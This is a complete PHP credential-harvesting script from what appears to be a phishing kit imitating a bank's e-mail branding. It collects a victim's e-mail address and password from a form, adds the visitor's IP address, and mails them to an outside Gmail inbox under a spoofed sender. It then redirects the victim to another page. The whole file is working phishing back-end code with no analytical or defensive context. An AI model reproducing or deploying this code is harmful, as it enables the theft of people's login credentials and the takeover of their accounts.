<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "e-mail: ".$_POST['pass3']."\n";
$msg .= "passw: ".$_POST['pass4']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "mercyhope278@gmail.com";
$subj = "$ip - ".$_POST['pass3']."\n";
$from = "From: BAwag Email<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: other.html");	  

?>